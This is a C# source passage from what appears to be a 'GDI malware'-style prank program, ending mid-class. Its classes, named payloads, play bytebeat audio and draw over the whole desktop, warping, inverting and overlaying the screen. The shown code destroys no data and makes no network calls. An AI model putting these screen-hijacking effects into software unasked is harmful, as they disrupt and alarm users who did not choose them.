using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Clyodrogen_safety;
using System.Drawing.Drawing2D;

internal static class Program
{
	private class bb1 : Payloads
	{
		private int redrawCounter;

		public override void Draw(IntPtr hdc)
		{
			using (var stream = new MemoryStream())
			{
				var writer = new BinaryWriter(stream);

				writer.Write("RIFF".ToCharArray());  // chunk id
				writer.Write((UInt32)0);             // chunk size
				writer.Write("WAVE".ToCharArray());  // format

				writer.Write("fmt ".ToCharArray());  // chunk id
				writer.Write((UInt32)16);            // chunk size
				writer.Write((UInt16)1);             // audio format

				var channels = 1;
				var sample_rate = 8000;
				var bits_per_sample = 8;

				writer.Write((UInt16)channels);
				writer.Write((UInt32)sample_rate);
				writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
				writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
				writer.Write((UInt16)bits_per_sample);

				writer.Write("data".ToCharArray());

				var seconds = 30;

				var data = new byte[sample_rate * seconds];

				for (var t = 0; t < data.Length; t++)
					data[t] = (byte)(
						((t >> 4) * t & (t >> 3 ^ t >> 4) + (t >> 5 | t >> 2)) | (t * (t >> 3 | t >> 6) >> (t >> 5 | t >> 7) ^ (t >> t) + ((t / 2) * t >> 12))
						//t * (42 & t >> 10)
						//t | t % 255 | t % 257
						//t * (t >> 9 | t >> 13) & 16
						);

				writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

				foreach (var elt in data) writer.Write(elt);

				writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
				writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

				stream.Seek(0, SeekOrigin.Begin);

				new SoundPlayer(stream).PlaySync();
			}
			Thread.Sleep(0);
		}
	}

	private class bb2 : Payloads
	{
		private int redrawCounter;

		public override void Draw(IntPtr hdc)
		{
			using (var stream = new MemoryStream())
			{
				var writer = new BinaryWriter(stream);

				writer.Write("RIFF".ToCharArray());  // chunk id
				writer.Write((UInt32)0);             // chunk size
				writer.Write("WAVE".ToCharArray());  // format

				writer.Write("fmt ".ToCharArray());  // chunk id
				writer.Write((UInt32)16);            // chunk size
				writer.Write((UInt16)1);             // audio format

				var channels = 1;
				var sample_rate = 22050;
				var bits_per_sample = 8;

				writer.Write((UInt16)channels);
				writer.Write((UInt32)sample_rate);
				writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
				writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
				writer.Write((UInt16)bits_per_sample);

				writer.Write("data".ToCharArray());

				var seconds = 30;

				var data = new byte[sample_rate * seconds];

				for (var t = 0; t < data.Length; t++)
					data[t] = (byte)(
						(((t >> 1) * (15 & (0x234568a0 >> ((t >> 8) & 28)))) | ((t >> 1) >> (t >> 15)) ^ (t >> 4)) + ((t >> 50) & (t & 10))
						//t * (42 & t >> 10)
						//t | t % 255 | t % 257
						//t * (t >> 9 | t >> 13) & 16
						);

				writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

				foreach (var elt in data) writer.Write(elt);

				writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
				writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

				stream.Seek(0, SeekOrigin.Begin);

				new SoundPlayer(stream).PlaySync();
			}
			Thread.Sleep(0);
		}
	}

	private class bb3 : Payloads
	{
		private int redrawCounter;

		public override void Draw(IntPtr hdc)
		{
			using (var stream = new MemoryStream())
			{
				var writer = new BinaryWriter(stream);

				writer.Write("RIFF".ToCharArray());  // chunk id
				writer.Write((UInt32)0);             // chunk size
				writer.Write("WAVE".ToCharArray());  // format

				writer.Write("fmt ".ToCharArray());  // chunk id
				writer.Write((UInt32)16);            // chunk size
				writer.Write((UInt16)1);             // audio format

				var channels = 1;
				var sample_rate = 8000;
				var bits_per_sample = 8;

				writer.Write((UInt16)channels);
				writer.Write((UInt32)sample_rate);
				writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
				writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
				writer.Write((UInt16)bits_per_sample);

				writer.Write("data".ToCharArray());

				var seconds = 30;

				var data = new byte[sample_rate * seconds];

				for (var t = 0; t < data.Length; t++)
					data[t] = (byte)(
						(t * (t >> 5 | t >> 8) | t >> 80 ^ t) + 64
						//t * (42 & t >> 10)
						//t | t % 255 | t % 257
						//t * (t >> 9 | t >> 13) & 16
						);

				writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

				foreach (var elt in data) writer.Write(elt);

				writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
				writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

				stream.Seek(0, SeekOrigin.Begin);

				new SoundPlayer(stream).PlaySync();
			}
			Thread.Sleep(0);
		}
	}

	private class bb4 : Payloads
	{
		private int redrawCounter;

		public override void Draw(IntPtr hdc)
		{
			using (var stream = new MemoryStream())
			{
				var writer = new BinaryWriter(stream);

				writer.Write("RIFF".ToCharArray());  // chunk id
				writer.Write((UInt32)0);             // chunk size
				writer.Write("WAVE".ToCharArray());  // format

				writer.Write("fmt ".ToCharArray());  // chunk id
				writer.Write((UInt32)16);            // chunk size
				writer.Write((UInt16)1);             // audio format

				var channels = 1;
				var sample_rate = 8000;
				var bits_per_sample = 8;

				writer.Write((UInt16)channels);
				writer.Write((UInt32)sample_rate);
				writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
				writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
				writer.Write((UInt16)bits_per_sample);

				writer.Write("data".ToCharArray());

				var seconds = 30;

				var data = new byte[sample_rate * seconds];

				for (var t = 0; t < data.Length; t++)
					data[t] = (byte)(
						(t * (t >> 5 | t >> 8) | t >> 80 ^ t) + 64
						//t * (42 & t >> 10)
						//t | t % 255 | t % 257
						//t * (t >> 9 | t >> 13) & 16
						);

				writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

				foreach (var elt in data) writer.Write(elt);

				writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
				writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

				stream.Seek(0, SeekOrigin.Begin);

				new SoundPlayer(stream).PlaySync();
			}
			Thread.Sleep(0);
		}
	}

	private class bb5 : Payloads
	{
		private int redrawCounter;

		public override void Draw(IntPtr hdc)
		{
			using (var stream = new MemoryStream())
			{
				var writer = new BinaryWriter(stream);

				writer.Write("RIFF".ToCharArray());  // chunk id
				writer.Write((UInt32)0);             // chunk size
				writer.Write("WAVE".ToCharArray());  // format

				writer.Write("fmt ".ToCharArray());  // chunk id
				writer.Write((UInt32)16);            // chunk size
				writer.Write((UInt16)1);             // audio format

				var channels = 1;
				var sample_rate = 8000;
				var bits_per_sample = 8;

				writer.Write((UInt16)channels);
				writer.Write((UInt32)sample_rate);
				writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
				writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
				writer.Write((UInt16)bits_per_sample);

				writer.Write("data".ToCharArray());

				var seconds = 30;

				var data = new byte[sample_rate * seconds];

				for (var t = 0; t < data.Length; t++)
					data[t] = (byte)(
						3 * (t >> 6 | t | t >> (t >> 16)) + (7 & t >> 11) * t / 100 * t
						//t * (42 & t >> 10)
						//t | t % 255 | t % 257
						//t * (t >> 9 | t >> 13) & 16
						);

				writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

				foreach (var elt in data) writer.Write(elt);

				writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
				writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

				stream.Seek(0, SeekOrigin.Begin);

				new SoundPlayer(stream).PlaySync();
			}
			Thread.Sleep(0);
		}
	}

	private class bb6 : Payloads
	{
		private int redrawCounter;

		public override void Draw(IntPtr hdc)
		{
			using (var stream = new MemoryStream())
			{
				var writer = new BinaryWriter(stream);

				writer.Write("RIFF".ToCharArray());  // chunk id
				writer.Write((UInt32)0);             // chunk size
				writer.Write("WAVE".ToCharArray());  // format

				writer.Write("fmt ".ToCharArray());  // chunk id
				writer.Write((UInt32)16);            // chunk size
				writer.Write((UInt16)1);             // audio format

				var channels = 1;
				var sample_rate = 8000;
				var bits_per_sample = 8;

				writer.Write((UInt16)channels);
				writer.Write((UInt32)sample_rate);
				writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
				writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
				writer.Write((UInt16)bits_per_sample);

				writer.Write("data".ToCharArray());

				var seconds = 60;

				var data = new byte[sample_rate * seconds];

				for (var t = 0; t < data.Length; t++)
					data[t] = (byte)(
						9 * t & t >> 4 | 5 * t & t >> 7 | 3 * t & t >> 10
						//t * (42 & t >> 10)
						//t | t % 255 | t % 257
						//t * (t >> 9 | t >> 13) & 16
						);

				writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

				foreach (var elt in data) writer.Write(elt);

				writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
				writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

				stream.Seek(0, SeekOrigin.Begin);

				new SoundPlayer(stream).PlaySync();
			}
			Thread.Sleep(0);
		}
	}


	private class payload1 : Payloads
	{
		public override void Draw(IntPtr hdc)
		{
			Random r = new Random();
			int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height;
			int left = Screen.PrimaryScreen.Bounds.Left, right = Screen.PrimaryScreen.Bounds.Right, top = Screen.PrimaryScreen.Bounds.Top, bottom = Screen.PrimaryScreen.Bounds.Bottom;
			POINT[] lppoint = new POINT[3];
			lppoint[0].X = (left + 50) + 0;
			lppoint[0].Y = (top - 50) + 0;
			lppoint[1].X = (right + 50) + 0;
			lppoint[1].Y = (top + 50) + 0;
			lppoint[2].X = (left - 50) + 0;
			lppoint[2].Y = (bottom - 50) + 0;
			PlgBlt(hdc, lppoint, hdc, left - 20, top - 20, (right - left) + 40, (bottom - top) + 40, IntPtr.Zero, 0, 0);
			Thread.Sleep(0);
		}
	}

	private class payload2 : Payloads
	{
		private int redrawCounter;

		public override void Draw(IntPtr hdc)
		{
			try
			{
				Graphics g = Graphics.FromHdc(hdc);
				Pen barako = new Pen(Color.FromArgb(random.Next(255), random.Next(255), random.Next(255), random.Next(255)), random.Next(50));
				barako.LineJoin = System.Drawing.Drawing2D.LineJoin.Round;
				barako.StartCap = barako.EndCap = System.Drawing.Drawing2D.LineCap.RoundAnchor;
				Point[] ptsArray =
		  {
			new Point(random.Next(-screenW,screenW+screenW), random.Next(-screenH,screenH+screenH)),new Point(random.Next(-screenW,screenW+screenW), random.Next(-screenH,screenH+screenH)),
	  };

				g.DrawLines(barako, ptsArray);
			}
			catch { }
		}
	}
	public static Image SetOpacity(this Image image, float opacity)
	{
		var colorMatrix = new ColorMatrix();
		colorMatrix.Matrix33 = opacity;
		var imageAttributes = new ImageAttributes();
		imageAttributes.SetColorMatrix(
			colorMatrix,
			ColorMatrixFlag.Default,
			ColorAdjustType.Bitmap);
		var output = new Bitmap(image.Width, image.Height);
		using (var gfx = Graphics.FromImage(output))
		{
			gfx.DrawImage(
				image,
				new Rectangle(0, 0, image.Width, image.Height),
				0,
				0,
				image.Width,
				image.Height,
				GraphicsUnit.Pixel,
				imageAttributes);
		}
		return output;
	}
	public static void ApplyNormalPixelate(ref Bitmap bmp, Size squareSize)
	{
		Bitmap TempBmp = (Bitmap)bmp.Clone();

		BitmapData bmpData = bmp.LockBits(new Rectangle(0, 0, bmp.Width, bmp.Height), ImageLockMode.ReadWrite, PixelFormat.Format24bppRgb);
		BitmapData TempBmpData = TempBmp.LockBits(new Rectangle(0, 0, TempBmp.Width, TempBmp.Height), ImageLockMode.ReadOnly, PixelFormat.Format24bppRgb);

		unsafe
		{
			byte* ptr = (byte*)bmpData.Scan0.ToPointer();
			byte* TempPtr = (byte*)TempBmpData.Scan0.ToPointer();

			int stopAddress = (int)ptr + bmpData.Stride * bmpData.Height;

			int Val = 0;
			int i = 0, X = 0, Y = 0;
			int BmpStride = bmpData.Stride;
			int BmpWidth = bmp.Width;
			int BmpHeight = bmp.Height;
			int SqrWidth = squareSize.Width;
			int SqrHeight = squareSize.Height;
			int XVal = 0, YVal = 0;

			while ((int)ptr != stopAddress)
			{
				X = i % BmpWidth;
				Y = i / BmpWidth;

				XVal = X + (SqrWidth - X % SqrWidth);
				YVal = Y + (SqrHeight - Y % SqrHeight);

				if (XVal < 0 && XVal >= BmpWidth)
					XVal = 0;

				if (YVal < 0 && YVal >= BmpHeight)
					YVal = 0;

				if (XVal > 0 && XVal < BmpWidth && YVal > 0 && YVal < BmpHeight)
				{
					Val = (YVal * BmpStride) + (XVal * 3);

					ptr[0] = TempPtr[Val];
					ptr[1] = TempPtr[Val + 1];
					ptr[2] = TempPtr[Val + 2];
				}

				ptr += 3;
				i++;
			}
		}

		bmp.UnlockBits(bmpData);
		TempBmp.UnlockBits(TempBmpData);
	}

	[DllImport("Shell32.dll", EntryPoint = "ExtractIconExW", CharSet = CharSet.Unicode, ExactSpelling = true,
CallingConvention = CallingConvention.StdCall)]
	private static extern int ExtractIconEx(string sFile, int iIndex, out IntPtr piLargeVersion,
out IntPtr piSmallVersion, int amountIcons);
	public static Icon Extract(string file, int number, bool largeIcon)
	{
		IntPtr large;
		IntPtr small;
		ExtractIconEx(file, number, out large, out small, 1);
		try
		{
			return Icon.FromHandle(largeIcon ? large : small);
		}
		catch
		{
			return null;
		}
	}

	private class payload3 : Payloads
	{
		Icon app = Extract("shell32.dll", 2, true);
		Icon help_ico = Extract("shell32.dll", 277, true);
		public override void Draw(IntPtr hdc)
		{
			try
			{
				Graphics g = Graphics.FromHdc(hdc);
				g.DrawIcon(app, random.Next(screenW), random.Next(screenH));
				Thread.Sleep(100);
				g.DrawIcon(help_ico, random.Next(screenW), random.Next(screenH));
				Thread.Sleep(100);
			}
			catch { }
		}
	}

	#region rgb to hsl
	public struct RGB
	{
		private byte _r;
		private byte _g;
		private byte _b;

		public RGB(byte r, byte g, byte b)
		{
			this._r = r;
			this._g = g;
			this._b = b;
		}

		public byte R
		{
			get { return this._r; }
			set { this._r = value; }
		}

		public byte G
		{
			get { return this._g; }
			set { this._g = value; }
		}

		public byte B
		{
			get { return this._b; }
			set { this._b = value; }
		}

		public bool Equals(RGB rgb)
		{
			return (this.R == rgb.R) && (this.G == rgb.G) && (this.B == rgb.B);
		}
	}

	public struct HSL
	{
		private int _h;
		private float _s;
		private float _l;

		public HSL(int h, float s, float l)
		{
			this._h = h;
			this._s = s;
			this._l = l;
		}

		public int H
		{
			get { return this._h; }
			set { this._h = value; }
		}

		public float S
		{
			get { return this._s; }
			set { this._s = value; }
		}

		public float L
		{
			get { return this._l; }
			set { this._l = value; }
		}

		public bool Equals(HSL hsl)
		{
			return (this.H == hsl.H) && (this.S == hsl.S) && (this.L == hsl.L);
		}
	}

	public static RGB HSLToRGB(HSL hsl)
	{
		byte r = 0;
		byte g = 0;
		byte b = 0;

		if (hsl.S == 0)
		{
			r = g = b = (byte)(hsl.L * 255);
		}
		else
		{
			float v1, v2;
			float hue = (float)hsl.H / 360;

			v2 = (hsl.L < 0.5) ? (hsl.L * (1 + hsl.S)) : ((hsl.L + hsl.S) - (hsl.L * hsl.S));
			v1 = 2 * hsl.L - v2;

			r = (byte)(255 * HueToRGB(v1, v2, hue + (1.0f / 3)));
			g = (byte)(255 * HueToRGB(v1, v2, hue));
			b = (byte)(255 * HueToRGB(v1, v2, hue - (1.0f / 3)));
		}

		return new RGB(r, g, b);
	}

	private static float HueToRGB(float v1, float v2, float vH)
	{
		if (vH < 0)
			vH += 1;

		if (vH > 1)
			vH -= 1;

		if ((6 * vH) < 1)
			return (v1 + (v2 - v1) * 6 * vH);

		if ((2 * vH) < 1)
			return v2;

		if ((3 * vH) < 2)
			return (v1 + (v2 - v1) * ((2.0f / 3) - vH) * 6);

		return v1;
	}
	#endregion

	private class payload4 : Payloads
	{
		private int redrawCounter;
		private int codcod;
		public override void Draw(IntPtr hdc)
		{
			try
			{
				Graphics g = Graphics.FromHdc(hdc);
				redrawCounter += 1;
				int cc = redrawCounter;
				codcod += 2;
				int cod = codcod;
				HSL data = new HSL(cc, 1f, 0.5f);
				RGB value = HSLToRGB(data);
				HSL data1 = new HSL(cod, 1f, 0.5f);
				RGB value1 = HSLToRGB(data1);
				SolidBrush sb = new SolidBrush(Color.FromArgb(value.R, value.G, value.B));
				SolidBrush blk = new SolidBrush(Color.White);
				Pen pen = new Pen(Color.White, 2);
				g.FillEllipse(blk, Cursor.Position.X - 51, Cursor.Position.Y - 51, 102, 102);
				g.FillEllipse(sb, Cursor.Position.X - 50, Cursor.Position.Y - 50, 100, 100);
				g.FillEllipse(blk, Cursor.Position.X - 26, Cursor.Position.Y - 26, 52, 52);
				g.FillEllipse(sb, Cursor.Position.X - 25, Cursor.Position.Y - 25, 50, 50);
				redrawCounter += 1;
				if (redrawCounter >= 360) { redrawCounter = 0; }
				if (codcod >= 360) { codcod = 0; }
			}
			catch { }
			Thread.Sleep(0);
		}
	}
	[DllImport("gdi32.dll")]
	static extern bool PlgBlt(IntPtr hdcDest, POINT[] lpPoint, IntPtr hdcSrc,
int nXSrc, int nYSrc, int nWidth, int nHeight, IntPtr hbmMask, int xMask,
int yMask);
	[DllImport("user32.dll")]
	static extern IntPtr GetDesktopWindow();
	[DllImport("user32.dll")]
	static extern IntPtr GetWindowDC(IntPtr hWnd);
	public struct POINT
	{
		public int X;
		public int Y;

		public POINT(int x, int y)
		{
			this.X = x;
			this.Y = y;
		}

		public static implicit operator System.Drawing.Point(POINT p)
		{
			return new System.Drawing.Point(p.X, p.Y);
		}

		public static implicit operator POINT(System.Drawing.Point p)
		{
			return new POINT(p.X, p.Y);
		}
	}

	private class payload5 : Payloads
	{
		private int redrawCounter;
		private int redrawCounter1;
		public override void Draw(IntPtr hdc)
		{
			Random r = new Random();
			int x = Screen.PrimaryScreen.Bounds.X;
			int y = Screen.PrimaryScreen.Bounds.Y;
			int left = Screen.PrimaryScreen.Bounds.Left;
			int top = Screen.PrimaryScreen.Bounds.Top;
			int right = Screen.PrimaryScreen.Bounds.Right;
			int bottom = Screen.PrimaryScreen.Bounds.Bottom;
			IntPtr hwnd = GetDesktopWindow();
			POINT[] lppoint = new POINT[3];
			lppoint[0].X = left + (random.Next(screenW));
			lppoint[0].Y = top + (random.Next(screenH));
			lppoint[1].X = right + (random.Next(screenW));
			lppoint[1].Y = top - (random.Next(screenH));
			lppoint[2].X = left + (random.Next(screenW));
			lppoint[2].Y = bottom + (random.Next(screenH));
			PlgBlt(hdc, lppoint, hdc, left, top, right - left, bottom - top, IntPtr.Zero, 0, 0);
			Thread.Sleep(0);
		}
	}

	private class payload6 : Payloads
	{
		private int redrawCounter;

		public override void Draw(IntPtr hdc)
		{
			try
			{
				Graphics g = Graphics.FromHdc(hdc);
				//Create a new bitmap.
				var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
											   Screen.PrimaryScreen.Bounds.Height,
											   PixelFormat.Format32bppArgb);

				// Create a graphics object from the bitmap.
				var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

				// Take the screenshot from the upper left corner to the right bottom corner.
				gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
											Screen.PrimaryScreen.Bounds.Y,
											0,
											0,
											Screen.PrimaryScreen.Bounds.Size,
											CopyPixelOperation.SourceCopy);
				ApplyNormalPixelate(ref bmpScreenshot, new Size(10, 10));
				Image bmp = SetOpacity(bmpScreenshot, 0.1F);
				g.DrawImage(bmp, 5, 5);
			}
			catch { }
			Thread.Sleep(0);
		}
	}
	private static byte[] CreateGammaArray(double color)
	{
		byte[] gammaArray = new byte[256];
		for (int i = 0; i < 256; ++i)
		{
			gammaArray[i] = (byte)Math.Min(255,
	(int)((255.0 * Math.Pow(i / 255.0, 1.0 / color)) + 0.5));
		}
		return gammaArray;
	}

	private class payload7 : Payloads
	{
		public override void Draw(IntPtr hdc)
		{
			try
			{
				Random r = new Random();
				int rx = r.Next(-screenW, screenW);
				int ry = r.Next(-screenH, screenH);
				int rx1 = r.Next(-screenW, screenW);
				int ry1 = r.Next(-screenH, screenH);
				int dest = r.Next(0, 500);
				Graphics g = Graphics.FromHdc(hdc);
				System.Drawing.Brush _Brush = new SolidBrush(System.Drawing.Color.FromArgb(100, r.Next(0, 255), r.Next(0, 255), r.Next(0, 255)));
				System.Drawing.SolidBrush myBrush = new System.Drawing.SolidBrush(Color.Pink);
				myBrush.Color = Color.FromArgb(25, r.Next(0, 255), r.Next(0, 255), r.Next(0, 255));
				g.FillRectangle(myBrush, new Rectangle(rx, ry, dest, dest));
				Thread.Sleep(10);
				g.FillEllipse(myBrush, new Rectangle(rx1, ry1, dest, dest));
				Thread.Sleep(10);
			}
			catch { }
		}
	}

	private class payload8 : Payloads
	{
		private int rd;
		public override void Draw(IntPtr hdc)
		{
			int rndx = random.Next(0, screenW);
			int rndy = random.Next(0, screenH);
			int rnds = random.Next(25, 100);
			int rndsize = random.Next(0, 1000);
			for (int i = 0; i < rndsize; i += rnds)
			{
				PatBlt(hdc, rndx - i / 2, rndy - i / 2, i, i, CopyPixelOperation.PatInvert);
				Thread.Sleep(1);
			}
		}
	}

	private class payload9 : Payloads
	{
		Image r = Clyodrogen_safety.Properties.Resources.Bluetooth_PNG_Free_Download;
		public override void Draw(IntPtr hdc)
		{
			try
			{
				StretchBlt(hdc, screenW + random.Next(-10, 11), random.Next(-10, 11), -screenW + random.Next(-10, 11), screenH + random.Next(-10, 11), hdc, 0 + random.Next(-10, 11), 0 + random.Next(-10, 11), screenW + random.Next(-10, 11), screenH + random.Next(-10, 11), TernaryRasterOperations.SRCCOPY);
			}
			catch { }
			Thread.Sleep(0);
		}
	}
	private class Drawer16 : Payloads
	{
		private int redrawCounter;
		private int codcod;
		public override void Draw(IntPtr hdc)
		{
			try
			{
				Graphics g = Graphics.FromHdc(hdc);
				redrawCounter += 1;
				int cc = redrawCounter;
				codcod += 2;
				int cod = codcod;
				HSL data = new HSL(cc, 1f, 0.5f);
				RGB value = HSLToRGB(data);
				HSL data1 = new HSL(cod, 1f, 0.5f);
				RGB value1 = HSLToRGB(data1);
				HatchBrush sb = new HatchBrush(HatchStyle.DottedDiamond, Color.FromArgb(value.R, value.G, value.B), Color.Transparent);
				g.FillRectangle(sb, 0, 0, screenW, screenH);
				redrawCounter += 1;
				if (redrawCounter >= 360) { redrawCounter = 0; }
				if (codcod >= 360) { codcod = 0; }
			}
			catch { }
			Thread.Sleep(0);
		}
	}

	private class payload10 : Payloads
	{
		private int draw;
		public override void Draw(IntPtr hdc)
		{
			try
			{
				Graphics gr = Graphics.FromHdc(hdc);
				//Create a new bitmap.
				var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
											   Screen.PrimaryScreen.Bounds.Height,
											   PixelFormat.Format32bppArgb);

				// Create a graphics object from the bitmap.
				var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

				// Take the screenshot from the upper left corner to the right bottom corner.
				gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
											Screen.PrimaryScreen.Bounds.Y,
											0,
											0,
											Screen.PrimaryScreen.Bounds.Size,
											CopyPixelOperation.SourceCopy);
				Bitmap image = new Bitmap(bmpScreenshot);
				Bitmap sharpenImage = (Bitmap)image.Clone();

				int filterWidth = 3;
				int filterHeight = 3;
				int width = image.Width;
				int height = image.Height;

				// Create sharpening filter.
				double[,] filter = new double[filterWidth, filterHeight];
				filter[0, 0] = filter[0, 1] = filter[0, 2] = filter[1, 0] = filter[1, 2] = filter[2, 0] = filter[2, 1] = filter[2, 2] = -1;
				filter[1, 1] = 9;

				double factor = 1.0;
				double bias = 0.0;

				Color[,] result = new Color[image.Width, image.Height];

				// Lock image bits for read/write.
				BitmapData pbits = sharpenImage.LockBits(new Rectangle(0, 0, width, height), ImageLockMode.ReadWrite, PixelFormat.Format24bppRgb);

				// Declare an array to hold the bytes of the bitmap.
				int bytes = pbits.Stride * height;
				byte[] rgbValues = new byte[bytes];

				// Copy the RGB values into the array.
				System.Runtime.InteropServices.Marshal.Copy(pbits.Scan0, rgbValues, 0, bytes);

				int rgb;
				// Fill the color array with the new sharpened color values.
				for (int x = 0; x < width; ++x)
				{
					for (int y = 0; y < height; ++y)
					{
						double red = 0.0, green = 0.0, blue = 0.0;

						for (int filterX = 0; filterX < filterWidth; filterX++)
						{
							for (int filterY = 0; filterY < filterHeight; filterY++)
							{
								int imageX = (x - filterWidth / 2 + filterX + width) % width;
								int imageY = (y - filterHeight / 2 + filterY + height) % height;

								rgb = imageY * pbits.Stride + 3 * imageX;

								red += rgbValues[rgb + 2] * filter[filterX, filterY];
								green += rgbValues[rgb + 1] * filter[filterX, filterY];
								blue += rgbValues[rgb + 0] * filter[filterX, filterY];
							}
							int r = Math.Min(Math.Max((int)(factor * red + bias), 0), 255);
							int g = Math.Min(Math.Max((int)(factor * green + bias), 0), 255);
							int b = Math.Min(Math.Max((int)(factor * blue + bias), 0), 255);

							result[x, y] = Color.FromArgb(r, g, b);
						}
					}
				}

				// Update the image with the sharpened pixels.
				for (int x = 0; x < width; ++x)
				{
					for (int y = 0; y < height; ++y)
					{
						rgb = y * pbits.Stride + 3 * x;

						rgbValues[rgb + 2] = result[x, y].R;
						rgbValues[rgb + 1] = result[x, y].G;
						rgbValues[rgb + 0] = result[x, y].B;
					}
				}

				// Copy the RGB values back to the bitmap.
				System.Runtime.InteropServices.Marshal.Copy(rgbValues, 0, pbits.Scan0, bytes);
				// Release image bits.
				sharpenImage.UnlockBits(pbits);
				Image sd = SetOpacity(sharpenImage, 0.1F);
				gr.DrawImage(sd, 0, 0);
			}
			catch { }
			Thread.Sleep(0);
		}
	}

	private class payload11 : Payloads
	{
		private int redrawCounter;
		public override void Draw(IntPtr hdc)
		{
			try
			{
				redrawCounter += 1;
				int cc = redrawCounter;
				HSL data = new HSL(cc, 1f, 0.5f);
				RGB value = HSLToRGB(data);
				Graphics g = Graphics.FromHdc(hdc);
				// Create a path that consists of a single ellipse.
				GraphicsPath path = new GraphicsPath();
				Rectangle pathRect = new Rectangle(0, 0, screenW, screenH);
				path.AddRectangle(pathRect);

				// Use the path to construct a brush.
				PathGradientBrush pthGrBrush = new PathGradientBrush(path);

				// Set the color at the center of the path to blue.
				pthGrBrush.CenterColor = Color.FromArgb(0, 0, 0, 255);

				// Set the color along the entire boundary 
				// of the path to aqua.
				Color[] colors = { Color.FromArgb(127, value.R, value.G, value.B) };
				pthGrBrush.SurroundColors = colors;

				g.FillRectangle(pthGrBrush, 0, 0, screenW, screenH);
				if (redrawCounter >= 360) { redrawCounter = 0; }
			}
			catch { }
			Thread.Sleep(0);
		}
	}

	private class payload12 : Payloads
	{
		Image r = Clyodrogen_safety.Properties.Resources.Bluetooth_PNG_Free_Download;
		public override void Draw(IntPtr hdc)
		{
			try
			{
				Graphics g = Graphics.FromHdc(hdc);
				g.SmoothingMode = SmoothingMode.AntiAlias;
				g.DrawImage(r, random.Next(screenW), random.Next(screenH), random.Next(screenW), random.Next(screenH));
			}
			catch { }
			Thread.Sleep(0);
		}
	}
	public static Color FromAhsb(int alpha, float hue, float saturation, float brightness)
	{

		if (0 > alpha || 255 < alpha)
		{
			throw new ArgumentOutOfRangeException("alpha", alpha,
			  "Value must be within a range of 0 - 255.");
		}
		if (0f > hue || 360f < hue)
		{
			throw new ArgumentOutOfRangeException("hue", hue,
			  "Value must be within a range of 0 - 360.");
		}
		if (0f > saturation || 1f < saturation)
		{
			throw new ArgumentOutOfRangeException("saturation", saturation,
			  "Value must be within a range of 0 - 1.");
		}
		if (0f > brightness || 1f < brightness)
		{
			throw new ArgumentOutOfRangeException("brightness", brightness,
			  "Value must be within a range of 0 - 1.");
		}

		if (0 == saturation)
		{
			return Color.FromArgb(alpha, Convert.ToInt32(brightness * 255),
			  Convert.ToInt32(brightness * 255), Convert.ToInt32(brightness * 255));
		}

		float fMax, fMid, fMin;
		int iSextant, iMax, iMid, iMin;

		if (0.5 < brightness)
		{
			fMax = brightness - (brightness * saturation) + saturation;
			fMin = brightness + (brightness * saturation) - saturation;
		}
		else
		{
			fMax = brightness + (brightness * saturation);
			fMin = brightness - (brightness * saturation);
		}

		iSextant = (int)Math.Floor(hue / 60f);
		if (300f <= hue)
		{
			hue -= 360f;
		}
		hue /= 60f;
		hue -= 2f * (float)Math.Floor(((iSextant + 1f) % 6f) / 2f);
		if (0 == iSextant % 2)
		{
			fMid = hue * (fMax - fMin) + fMin;
		}
		else
		{
			fMid = fMin - hue * (fMax - fMin);
		}

		iMax = Convert.ToInt32(fMax * 255);
		iMid = Convert.ToInt32(fMid * 255);
		iMin = Convert.ToInt32(fMin * 255);

		switch (iSextant)
		{
			case 1:
				return Color.FromArgb(alpha, iMid, iMax, iMin);
			case 2:
				return Color.FromArgb(alpha, iMin, iMax, iMid);
			case 3:
				return Color.FromArgb(alpha, iMin, iMid, iMax);
			case 4:
				return Color.FromArgb(alpha, iMid, iMin, iMax);
			case 5:
				return Color.FromArgb(alpha, iMax, iMin, iMid);
			default:
				return Color.FromArgb(alpha, iMax, iMid, iMin);
		}
	}

	private class payload13 : Payloads
	{
		private int redrawCounter;
		private int codcod;
		public override void Draw(IntPtr hdc)
		{
			try
			{
				Graphics g = Graphics.FromHdc(hdc);
				redrawCounter += 1;
				int cc = redrawCounter;
				codcod += 2;
				int cod = codcod;
				HSL data = new HSL(cc, 1f, 0.5f);
